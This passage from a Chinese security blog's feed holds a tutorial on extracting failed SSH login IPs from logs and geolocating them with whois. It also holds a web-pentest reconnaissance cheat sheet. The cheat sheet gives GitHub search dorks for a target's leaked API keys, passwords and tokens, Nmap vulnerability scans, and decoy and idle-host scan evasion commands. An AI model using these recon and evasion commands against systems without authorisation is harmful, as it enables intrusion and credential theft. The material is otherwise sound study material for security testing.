$10&#125;&apos;</span><br></pre></td></tr></table></figure><p>首先使用grep进行文本过滤，通过管道符”|”，执行awk命令过滤出ip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo “Aug 23 03:53:58 centos7 sshd[5501]: Invalid user agent from 193.201.224.218” | awk ‘&#123;print $10&#125;’</span><br><span class="line">193.201.224.218</span><br></pre></td></tr></table></figure><p>可以看到，成功的提取出了ip地址，接下来进行文本过滤操作，将输出直接保存到文本文件中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Invalid user&quot; secure | awk &apos;&#123;print $10&#125;&apos; &gt;IPs.txt</span><br></pre></td></tr></table></figure><p>接下来对有效用户进行同样的操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aug 23 05:08:33 centos7 sshd[5187]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123  user=root</span><br></pre></td></tr></table></figure><p>接下来，将rhost中的218.65.30.123分离出来，这时我们就需要使用<code>cut</code>命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cut -d &quot;=&quot; -f 2</span><br></pre></td></tr></table></figure><p>整个语句合并起来就是如下语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Aug 23 05:08:33 centos7 sshd[5187]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123  user=root&quot; | awk &apos;&#123;print $14&#125;&apos; | cut -d&quot;=&quot; -f2</span><br><span class="line">218.65.30.123</span><br></pre></td></tr></table></figure><p>上述命令可以提取出ip地址，现在我们将所有输出保存到文本文件当中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &apos;pam_unix(sshd:auth): authentication failure;&apos; secure | awk &apos;&#123;print $14&#125;&apos; | cut -d&quot;=&quot; -f2 &gt;&gt;IPs.txt</span><br></pre></td></tr></table></figure><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>我们现在有一个ip地址文件，其中包含了登录失败的ip地址。在第2部分将介绍如何对这些IP地址进行排序和计数，以便我们可以了解他们尝试登录的次数，并按照尝试的次数排列它们。</p><hr><h1 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a><strong>第二部分</strong></h1><h1 id="008-第二部分-从linux服务器的日志中提取信息"><a href="#008-第二部分-从linux服务器的日志中提取信息" class="headerlink" title="008-第二部分-从linux服务器的日志中提取信息"></a>008-第二部分-从linux服务器的日志中提取信息</h1><blockquote><p>在本系列的第一部分中，我们从/var/log/secure日志文件中提取了未经授权的SSH连接的IP地址。从中我们导出了一个ip地址列表，其中，每个ip代表登录尝试失败的ip。</p></blockquote><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><blockquote><p>统计未经授权的SSH登录尝试失败/成功的次数。</p></blockquote><p>第二部分 目标</p><p>在这部分，主要使用bash工具<code>sort</code>、<code>uniq</code>等工具对其中的ip地址进行排序。</p><h2 id="第一部分-排序ip"><a href="#第一部分-排序ip" class="headerlink" title="第一部分 排序ip"></a>第一部分 排序ip</h2><blockquote><p>sort</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cat IPs.txt | sort</span><br><span class="line"></span><br><span class="line"># sort将按照字母顺序排序</span><br></pre></td></tr></table></figure><h2 id="计算相同ip的次数"><a href="#计算相同ip的次数" class="headerlink" title="计算相同ip的次数"></a>计算相同ip的次数</h2><blockquote><p>uniq</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat IPs.txt | sort | uniq -c</span><br></pre></td></tr></table></figure><h2 id="ip排名"><a href="#ip排名" class="headerlink" title="ip排名"></a>ip排名</h2><p>最后一步是按照日志文件中尝试ip的次数进行排序，再次使用<code>sort</code>命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## sort -n:正向排序</span><br><span class="line">## sort -r:反向排序</span><br><span class="line"></span><br><span class="line">cat IPs.txt | sort | uniq -c | sort -n</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-27_21-35-21.png" alt="1"></p><h2 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h2><p>你现在可以通过这些命令对所有的文件输出进行筛选。</p><p>在第三部分，我们将创建一个<code>for</code>循环来遍历排名的ip，并使用<code>whois</code>对每个ip进行查找，已找出他们来自那个国家。</p><hr><h1 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a><strong>第三部分</strong></h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>在本系列的第一部分和第二部分中，我们提取了未经授权的SSH登录尝试的ip地址，然后对其进行排序。现在我们已经得到了一个排列后的ip地址列表，我们需要找出这些ip地址来自那个国家。</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>通过<code>for</code>循环来遍历排列后的ip地址，利用<code>whois</code>对每个ip进行whois查询，找出这些ip来自哪些国家。</p><h2 id="for循环？"><a href="#for循环？" class="headerlink" title="for循环？"></a>for循环？</h2><blockquote><p>for循环是执行重复操作的一种方式。一些bash工具，如grep和awk可以接受前一个命令的输出。但是，其他命令，如whois不接受标准输入。必须运行他们提供的字符串。如ip地址或域名作为选项，这意味着我们必须为每个ip重复运行正确的结构化命令。为此，我们需要使用到for循环。</p></blockquote><blockquote><p>for巡检的结构如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i in x;do</span><br><span class="line">      command i</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>其中x是输入，如ip地址列表，i是一个变量，从ip地址列表中获取的一行，每次循环，i都会变。</p><p>也可以这么写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in X; do command $i; done</span><br></pre></td></tr></table></figure><p>1)、生成有效的输入</p><p>我们的第一步就是构建一个for循环，生成可以迭代的输入，需要一个每行一个文本字符串的列表。</p><p>列表如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat sort-ips.txt</span></span><br><span class="line">      1 211.21.218.75</span><br><span class="line">      2 182.97.215.127</span><br><span class="line">      2 46.148.18.114</span><br><span class="line">      3 222.74.225.125</span><br><span class="line">      3 46.27.238.200</span><br><span class="line">      6 111.20.245.25</span><br><span class="line">      6 112.101.165.34</span><br><span class="line">      6 116.236.124.48</span><br><span class="line">      6 123.144.62.228</span><br><span class="line">      6 125.117.0.7</span><br><span class="line">      6 176.53.82.66</span><br><span class="line">      6 189.10.52.92</span><br><span class="line">      6 191.85.175.35</span><br><span class="line">      6 196.43.235.219</span><br><span class="line">      6 78.198.26.81</span><br><span class="line">      9 106.6.176.243</span><br></pre></td></tr></table></figure><blockquote><p>进一步过滤：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat sort-ips.txt | awk '&#123;print $2&#125;'</span></span><br><span class="line">211.21.218.75</span><br><span class="line">182.97.215.127</span><br><span class="line">46.148.18.114</span><br><span class="line">222.74.225.125</span><br><span class="line">46.27.238.200</span><br><span class="line">111.20.245.25</span><br><span class="line">112.101.165.34</span><br><span class="line">116.236.124.48</span><br><span class="line">123.144.62.228</span><br><span class="line">125.117.0.7</span><br><span class="line">176.53.82.66</span><br><span class="line">189.10.52.92</span><br><span class="line">191.85.175.35</span><br><span class="line">196.43.235.219</span><br><span class="line">78.198.26.81</span><br><span class="line">106.6.176.243</span><br></pre></td></tr></table></figure><h2 id="将命令插入到for循环中"><a href="#将命令插入到for循环中" class="headerlink" title="将命令插入到for循环中"></a>将命令插入到for循环中</h2><p>现在我们有了一个命令来产生我们需要的输入，我们可以使用这个代替我们的for循环中的X。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(cat sorted-IPs.txt | awk &apos;&#123;print $2&#125;&apos;); do command $i; done</span><br></pre></td></tr></table></figure><p>通过echo进行输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for i in $(cat sort-ips.txt | awk '&#123;print $2&#125;');do echo $i;done</span></span><br><span class="line">211.21.218.75</span><br><span class="line">182.97.215.127</span><br><span class="line">46.148.18.114</span><br><span class="line">222.74.225.125</span><br><span class="line">46.27.238.200</span><br><span class="line">111.20.245.25</span><br><span class="line">112.101.165.34</span><br><span class="line">116.236.124.48</span><br><span class="line">123.144.62.228</span><br><span class="line">125.117.0.7</span><br><span class="line">176.53.82.66</span><br><span class="line">189.10.52.92</span><br><span class="line">191.85.175.35</span><br><span class="line">196.43.235.219</span><br><span class="line">78.198.26.81</span><br><span class="line">106.6.176.243</span><br></pre></td></tr></table></figure><blockquote><p>利用whois进行查询</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for i in $(cat sort-ips.txt | awk '&#123;print $2&#125;');do echo whois $i;done</span></span><br><span class="line">whois 211.21.218.75</span><br><span class="line">whois 182.97.215.127</span><br><span class="line">whois 46.148.18.114</span><br><span class="line">whois 222.74.225.125</span><br><span class="line">whois 46.27.238.200</span><br><span class="line">whois 111.20.245.25</span><br><span class="line">whois 112.101.165.34</span><br><span class="line">whois 116.236.124.48</span><br><span class="line">whois 123.144.62.228</span><br><span class="line">whois 125.117.0.7</span><br><span class="line">whois 176.53.82.66</span><br><span class="line">whois 189.10.52.92</span><br><span class="line">whois 191.85.175.35</span><br><span class="line">whois 196.43.235.219</span><br><span class="line">whois 78.198.26.81</span><br><span class="line">whois 106.6.176.243</span><br></pre></td></tr></table></figure><blockquote><p>将echo删除，直接利用whois执行命令</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for i in $(cat sort-ips.txt | awk '&#123;print $2&#125;');do whois $i;done</span></span><br></pre></td></tr></table></figure><p>上述命令会输出一系列的输出，在一系列的输出，有一行是country： XX，我们只需要过滤出country就可以。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for i in $(cat sort-ips.txt | awk '&#123;print $2&#125;');do whois $i | grep -m1 country;done</span></span><br><span class="line">country:        TW</span><br><span class="line">country:        CN</span><br><span class="line">country:        UA</span><br><span class="line">country:        CN</span><br><span class="line">country:        ES</span><br><span class="line">country:        CN</span><br><span class="line">country:        CN</span><br><span class="line">country:        CN</span><br><span class="line">country:        CN</span><br><span class="line">country:        CN</span><br><span class="line">country:        TR</span><br><span class="line">country:     AR</span><br><span class="line">country:        NG</span><br><span class="line">country:        FR</span><br><span class="line">country:        CN</span><br></pre></td></tr></table></figure><blockquote><p>把<code>country:</code>删除，利用awk</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># for i in $(cat sort-ips.txt | awk &apos;&#123;print $2&#125;&apos;);do whois $i | grep -m1 country | awk &apos;&#123;print $2&#125;&apos;;done</span><br><span class="line">TW</span><br><span class="line">CN</span><br><span class="line">UA</span><br><span class="line">CN</span><br><span class="line">ES</span><br><span class="line">CN</span><br><span class="line">CN</span><br><span class="line">CN</span><br><span class="line">CN</span><br><span class="line">CN</span><br><span class="line">TR</span><br><span class="line">AR</span><br><span class="line">NG</span><br><span class="line">FR</span><br><span class="line">CN</span><br></pre></td></tr></table></figure><blockquote><p>将ip添加到上述输出</p></blockquote><p>第一种方式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for i in $(cat sort-ips.txt | awk '&#123;print $2&#125;');do echo $i;whois $i | grep -m1 country | awk '&#123;print $2&#125;';done</span></span><br><span class="line">211.21.218.75</span><br><span class="line">TW</span><br><span class="line">182.97.215.127</span><br><span class="line">CN</span><br><span class="line">46.148.18.114</span><br><span class="line">UA</span><br><span class="line">222.74.225.125</span><br><span class="line">CN</span><br><span class="line">46.27.238.200</span><br><span class="line">ES</span><br><span class="line">111.20.245.25</span><br><span class="line">CN</span><br><span class="line">112.101.165.34</span><br><span class="line">CN</span><br><span class="line">116.236.124.48</span><br><span class="line">CN</span><br><span class="line">123.144.62.228</span><br><span class="line">CN</span><br><span class="line">125.117.0.7</span><br><span class="line">CN</span><br><span class="line">176.53.82.66</span><br><span class="line">TR</span><br><span class="line">189.10.52.92</span><br><span class="line">191.85.175.35</span><br><span class="line">AR</span><br><span class="line">196.43.235.219</span><br><span class="line">NG</span><br><span class="line">78.198.26.81</span><br><span class="line">FR</span><br><span class="line">106.6.176.243</span><br><span class="line">CN</span><br></pre></td></tr></table></figure><p>第二种，利用echo进行输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># for i in $(cat sort-ips.txt | awk &apos;&#123;print $2&#125;&apos;);do echo &quot;$i $(whois $i | grep -m1 country | awk &apos;&#123;print $2&#125;&apos;)&quot;;done</span><br><span class="line">211.21.218.75 TW</span><br><span class="line">182.97.215.127 CN</span><br><span class="line">46.148.18.114 UA</span><br><span class="line">222.74.225.125 CN</span><br><span class="line">46.27.238.200 ES</span><br><span class="line">111.20.245.25 CN</span><br><span class="line">112.101.165.34 CN</span><br><span class="line">116.236.124.48 CN</span><br><span class="line">123.144.62.228 CN</span><br><span class="line">125.117.0.7 CN</span><br><span class="line">176.53.82.66 TR</span><br><span class="line">189.10.52.92</span><br><span class="line">191.85.175.35 AR</span><br><span class="line">196.43.235.219 NG</span><br><span class="line">78.198.26.81 FR</span><br><span class="line">106.6.176.243 CN</span><br></pre></td></tr></table></figure><blockquote><p>输出之后，利用<code>column</code>工具对输出进行格式化：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># for i in $(cat sort-ips.txt | awk &apos;&#123;print $2&#125;&apos;);do echo &quot;$i $(whois $i | grep -m1 country | awk &apos;&#123;print $2&#125;&apos;)&quot;;done | column -t</span><br><span class="line">211.21.218.75   TW</span><br><span class="line">182.97.215.127  CN</span><br><span class="line">46.148.18.114   UA</span><br><span class="line">222.74.225.125  CN</span><br><span class="line">46.27.238.200   ES</span><br><span class="line">111.20.245.25   CN</span><br><span class="line">112.101.165.34  CN</span><br><span class="line">116.236.124.48  CN</span><br><span class="line">123.144.62.228  CN</span><br><span class="line">125.117.0.7     CN</span><br><span class="line">176.53.82.66    TR</span><br><span class="line">189.10.52.92</span><br><span class="line">191.85.175.35   AR</span><br><span class="line">196.43.235.219  NG</span><br><span class="line">78.198.26.81    FR</span><br><span class="line">106.6.176.243   CN</span><br></pre></td></tr></table></figure><h2 id="结论-2"><a href="#结论-2" class="headerlink" title="结论"></a>结论</h2><p>本系列的目标是引导您使用bash工具在命令行中提取和处理数据。我希望你注意到，我们尽可能使用相同的工具来得到我们需要的结果。熟悉这些工具后，您将能够快速处理数据，而无需离开命令行。</p><p>文章来自：<a href="https://bash-prompt.net/guides/using-logs-1/，总共有三部分，我写在一块了，有删改。这个工具可以写成一个bash脚本，通过传入文件的参数输出不一样的内容，有时间写下，不是很难。" target="_blank" rel="noopener">https://bash-prompt.net/guides/using-logs-1/，总共有三部分，我写在一块了，有删改。这个工具可以写成一个bash脚本，通过传入文件的参数输出不一样的内容，有时间写下，不是很难。</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/wallhaven-442708.jpg&quot; alt=&quot;enter description here&quot; title=&quot;wallhaven-442708&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="linux" scheme="http://airs-sec.com/categories/linux/"/>
    
    
  </entry>
  
  <entry>
    <title>web安全信息收集</title>
    <link href="http://airs-sec.com/2018/01/04/web%E5%AE%89%E5%85%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://airs-sec.com/2018/01/04/web安全信息收集/</id>
    <published>2018-01-04T03:12:39.000Z</published>
    <updated>2018-01-04T03:23:00.819Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web安全信息收集"><a href="#web安全信息收集" class="headerlink" title="web安全信息收集"></a>web安全信息收集</h1><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1515035737450.jpg" alt="web安全信息收集"></p><a id="more"></a><blockquote><p>当我们拿到一个网站，如何开始对目标安全测试？是不是一上来，就拿出wvs先跑一遍，大部分人，包括我也是，拿到一个网站的时候，直接上漏洞扫描器对网站进行扫描。而往往忽略了前期信息收集的重要性。</p></blockquote><blockquote><p>在渗透测试的流程中，第一步为信息收集，可见信息收集的重要性，前期的信息收集决定了后期渗透利用是否能继续下去的重要一步。所谓知己知彼，百战不殆。</p></blockquote><hr><ul><li><p>信息收集</p><ul><li>用户名</li><li>邮件地址<ul><li><a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">theHarvester</a></li></ul></li><li><p>域名</p><ul><li><p>DNS</p><ul><li><a href="https://centralops.net/co/DomainDossier.aspx" target="_blank" rel="noopener">Domain Dossier</a>-可进行地址查询，域名记录，路由跟踪，服务扫描</li><li><a href="http://viewdns.info" target="_blank" rel="noopener">viewdns.info</a>-可查询真实ip，针对做了cdn加速</li><li><a href="http://whois.chinaz.com/?DomainName=target.com&amp;ws=" target="_blank" rel="noopener">站长之家</a></li><li><a href="https://whois.aizhan.com/target.com/" target="_blank" rel="noopener">爱站</a></li><li><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">天眼查</a></li><li><a href="https://github.com/search?q=target.com+password&amp;type=Code&amp;utf8=%E2%9C%93" target="_blank" rel="noopener">github泄露</a></li><li><a href="https://www.t00ls.net/domain.html" target="_blank" rel="noopener">tools在线工具</a></li><li><a href="http://searchdns.netcraft.com/" target="_blank" rel="noopener">netcraft</a></li></ul></li><li><p>子域名</p><ul><li><a href="https://pentest-tools.com/information-gathering/find-subdomains-of-domain" target="_blank" rel="noopener">find-subdomains</a>  - 查找子域名  </li><li>工具<ul><li>Layer子域名挖掘机V3.0 链接：<a href="https://pan.baidu.com/s/1jI9vDcy" target="_blank" rel="noopener">https://pan.baidu.com/s/1jI9vDcy</a> 密码：rykz</li><li>Layer子域名挖掘机4.1 重构版 链接：<a href="https://pan.baidu.com/s/1kUJmPKF" target="_blank" rel="noopener">https://pan.baidu.com/s/1kUJmPKF</a> 密码：ly5r</li><li><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a></li><li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">微步</a>-微步也可以对子域名进行扫描</li></ul></li></ul></li></ul></li><li><p>ip地址</p><ul><li><a href="http://site.ip138.com" target="_blank" rel="noopener">site.ip138</a>-ip/域名查询</li><li><a href="http://www.sameip.org/" target="_blank" rel="noopener">sameip</a>-反向ip查找</li><li><a href="http://tool.chinaz.com/" target="_blank" rel="noopener">站长之家</a>-集成了很多功能，包括域名/ip，seo查询，网站信息查询</li><li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">微步</a>-主打在线威胁情报分析</li><li><a href="http://viewdns.info" target="_blank" rel="noopener">viewdns</a>-可查询真实ip，针对做了cdn加速</li><li><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">在线C段查询</a></li><li><a href="http://www.hao7188.com/" target="_blank" rel="noopener">ip地址查询</a></li></ul></li><li><p>github信息收集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">“Hackme.tld” API_key</span><br><span class="line">“Hackme.tld” secret_key</span><br><span class="line">“Hackme.tld” aws_key</span><br><span class="line">“Hackme.tld” Password</span><br><span class="line">“Hackme.tld” FTP</span><br><span class="line">“Hackme.tld” login</span><br><span class="line">“Hackme.tld” github_token</span><br></pre></td></tr></table></figure><ul><li><a href="https://github.com/search?q=target.com+password&amp;type=Code&amp;utf8=%E2%9C%93" target="_blank" rel="noopener">github泄露</a></li><li><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">githack</a> - 针对github源码泄露漏洞</li></ul></li><li><p>端口服务</p><ul><li>利用nmap进行漏洞扫描,在扫描大段的地址时，可以采用过滤的方式将某些不需要的字符过滤，利用grep命令和cut命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    Nmap Full Web Vulnerable Scan</span><br><span class="line"></span><br><span class="line">    cd /usr/share/nmap/scripts/</span><br><span class="line">wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz</span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse target</span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target</span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target</span><br><span class="line">nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target</span><br><span class="line">nmap -sV --script=vuln target</span><br><span class="line">nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target</span><br></pre></td></tr></table></figure><ul><li>利用nmap进行端口扫描</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  Nmap Ports Scan</span><br><span class="line">1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)</span><br><span class="line">1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)</span><br><span class="line">2)fargement</span><br><span class="line">3)data packed – like orginal one not scan packet</span><br><span class="line">4)use auxiliary/scanner/ip/ipidseq for find zombie ip in network to use them to scan — nmap -sI ip target</span><br><span class="line">5)nmap –source-port 53 target</span><br><span class="line">nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target ( Randomize scan form diff IP)</span><br><span class="line">nmap -Pn -T2 -sV –randomize-hosts IP1,IP2</span><br><span class="line">nmap –script smb-check-vulns.nse -p445 target (using NSE scripts)</span><br><span class="line">nmap -sU -P0 -T Aggressive -p123 target (Aggresive Scan T1-T5)</span><br><span class="line">nmap -sA -PN -sN target</span><br><span class="line">nmap -sS -sV -T5 -F -A -O target (version detection)</span><br><span class="line">nmap -sU -v target (Udp)</span><br><span class="line">nmap -sU -P0 (Udp)</span><br><span class="line">nmap -sC 192.168.31.10-12 (all scan default)</span><br></pre></td></tr></table></figure><ul><li><a href="http://docs.ioin.in/writeup/blog.heysec.org/_archives_577/index.html" target="_blank" rel="noopener">端口渗透总结</a></li><li><a href="http://airs-sec.com/2017/04/10/nmap%E6%9C%80%E4%BD%B3%E6%89%AB%E6%8F%8F%E7%AD%96%E7%95%A5/">nmap最佳扫描策略</a></li></ul></li></ul></li></ul><hr><ul><li><p>其他</p><ul><li>敏感文件或目录</li></ul><blockquote><p>可以利用一些小工具扫描网站上是否存在敏感信息，常见的工具有：御剑。kali下则有<a href="http://sectools.org/tool/nikto/" target="_blank" rel="noopener">nikto</a>。</p></blockquote><blockquote><p>当然，一些敏感文件也可以通过常见的漏洞扫描器也可以发现，在找敏感文件或目录的时候，可以加载自己制作的文件/目录字典进行扫描，有针对性的去寻找。</p></blockquote><blockquote><p>这里提供一份字典文件，字典文件涉及的东西好多（用户名、密码、sqli测试、xss测试、敏感目录等等），都是从互联网上收集的。<br><code>链接：https://pan.baidu.com/s/1skY9Jv3 密码：jgel</code></p></blockquote><ul><li><p>御剑系列：<code>链接：https://pan.baidu.com/s/1nuAvvXR 密码：ozsg</code></p></li><li><p>web指纹识别</p><ul><li><p><a href="https://www.whatweb.net/" target="_blank" rel="noopener">whatweb</a> - whatweb是web指纹识别工具，包括cms、blog平台、统计/分析包、js库、web服务器指纹、嵌入式设备。WhatWeb拥有超过1000个插件，每个都可以识别不同的东西。WhatWeb还可识别版本号，电子邮件地址，帐户ID，Web框架模块，SQL错误等。</p><ul><li>用法：<code>whatweb target.com</code></li></ul></li><li><p>御剑web指纹识别工具-<code>链接：https://pan.baidu.com/s/1hsnLhQG 密码：jots</code></p></li><li><p><a href="http://whatweb.bugscaner.com" target="_blank" rel="noopener">Bugscaner</a></p></li><li><code>nmap -sV example.com</code></li><li><code>robots.txt</code>文件-通过浏览器进行测试。<a href="http://www.test.com/robots.txt" target="_blank" 